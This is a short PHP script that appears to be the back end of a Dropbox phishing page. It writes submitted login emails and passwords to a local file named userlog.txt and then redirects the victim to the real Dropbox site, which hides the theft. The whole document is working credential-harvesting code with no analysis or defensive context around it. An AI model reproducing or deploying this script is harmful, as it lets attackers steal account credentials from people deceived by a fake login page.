<?php

file_put_contents("userlog.txt", "Dropbox Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.dropbox.com');
exit();
